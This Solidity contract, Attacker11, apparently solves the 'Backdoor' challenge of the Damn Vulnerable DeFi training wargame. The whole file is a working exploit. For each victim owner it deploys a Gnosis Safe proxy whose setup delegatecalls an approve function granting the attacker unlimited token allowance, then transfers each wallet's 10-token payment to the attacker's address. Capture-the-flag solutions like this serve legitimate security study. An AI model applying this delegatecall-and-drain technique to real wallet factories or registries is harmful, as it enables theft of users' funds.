// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";
import "../DamnValuableToken.sol";

contract Attacker11 {
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18

    function attack(
        address _masterAddr,
        address _factoryAddr,
        address _regiAddr,
        address _tokenAddr,
        address _attackerAddr,
        address[] calldata _owners
    ) public {
        for (uint256 i = 0; i < _owners.length; i++) {
            bytes memory dlgPayload = abi.encodeWithSignature(
                "approve(address,address,uint256)",
                _tokenAddr,
                address(this),
                ~uint256(0)
            );

            address[] memory owner = new address[](1);
            owner[0] = _owners[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owner,
                1,
                address(this),
                dlgPayload,
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(_factoryAddr).createProxyWithCallback(
                _masterAddr,
                initializer,
                i,
                WalletRegistry(_regiAddr)
            );

            DamnValuableToken(_tokenAddr).transferFrom(
                address(proxy),
                _attackerAddr,
                TOKEN_PAYMENT
            );
        }
    }

    function approve(
        address _tokenAddr,
        address _spender,
        uint256 _amount
    ) external {
        DamnValuableToken(_tokenAddr).approve(_spender, _amount);
    }
}
